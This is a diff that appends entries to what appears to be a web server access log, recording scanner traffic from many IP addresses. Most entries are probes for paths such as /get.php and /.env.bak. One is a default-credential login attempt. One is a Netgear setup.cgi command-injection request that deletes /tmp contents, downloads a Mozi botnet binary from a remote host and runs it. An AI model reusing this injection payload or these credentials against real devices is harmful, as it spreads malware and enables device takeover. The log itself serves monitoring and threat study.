@@ -1554,3 +1554,23 @@ Press CTRL+C to quit
 138.197.125.21 - - [27/Mar/2025 18:33:50] "GET /download/powershell/ HTTP/1.1" 404 -
 138.197.125.21 - - [27/Mar/2025 18:33:50] "GET /get.php HTTP/1.1" 308 -
 78.188.37.36 - - [27/Mar/2025 18:38:30] "GET / HTTP/1.0" 200 -
+103.116.85.216 - - [27/Mar/2025 22:33:15] "GET / HTTP/1.1" 200 -
+165.220.190.31 - - [28/Mar/2025 01:12:38] "GET / HTTP/1.1" 200 -
+167.172.76.74 - - [28/Mar/2025 02:47:33] code 400, message Bad request version ('À\x14À')
+167.172.76.74 - - [28/Mar/2025 02:47:33] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x06\x0bÉÏ&Vr\x0bÜx/Ð\x1br\x96\x1d\x17º\x9a_?ùsý¤¥D~C\x06\x81ý\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+167.172.76.74 - - [28/Mar/2025 02:47:34] code 400, message Bad request version ('À\x14À')
+167.172.76.74 - - [28/Mar/2025 02:47:34] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03Hù\x1f\x82`Æû<®\x0dx\x9dÅX»ñ\x09¡\x18yÃRy­fÆ»+þæ\x09²\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+167.172.76.74 - - [28/Mar/2025 02:47:34] "GET / HTTP/1.1" 200 -
+167.172.76.74 - - [28/Mar/2025 02:47:35] "GET /download/powershell/ HTTP/1.1" 404 -
+167.172.76.74 - - [28/Mar/2025 02:47:35] "GET /get.php HTTP/1.1" 308 -
+185.100.87.136 - - [28/Mar/2025 02:56:30] code 400, message Bad request version ('À\x14À')
+185.100.87.136 - - [28/Mar/2025 02:56:30] "\x16\x03\x01\x00u\x01\x00\x00q\x03\x033^ò#\x81g\x0bK:u%³ÝãEö4.\x94#6S-vo\x80ó^¼L#½\x00\x00\x1aÀ/À+À\x11À\x07À\x13À\x09À\x14À" HTTPStatus.BAD_REQUEST -
+175.107.3.212 - - [28/Mar/2025 04:43:27] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://175.107.3.212:48672/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 308 -
+93.123.109.21 - - [28/Mar/2025 05:18:35] "GET / HTTP/1.1" 200 -
+93.123.109.21 - - [28/Mar/2025 05:18:36] "GET /favicon.ico HTTP/1.1" 308 -
+93.123.109.21 - - [28/Mar/2025 05:18:36] "GET /favicon.ico/ HTTP/1.1" 404 -
+103.171.189.139 - - [28/Mar/2025 05:19:38] "GET / HTTP/1.1" 200 -
+175.107.0.163 - - [28/Mar/2025 05:51:58] "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0" 404 -
+134.199.224.169 - - [28/Mar/2025 06:57:08] "GET / HTTP/1.1" 200 -
+134.199.224.169 - - [28/Mar/2025 06:57:08] "GET /favicon.ico HTTP/1.1" 308 -
+106.12.155.238 - - [28/Mar/2025 09:44:25] "GET /.env.bak HTTP/1.1" 308 -
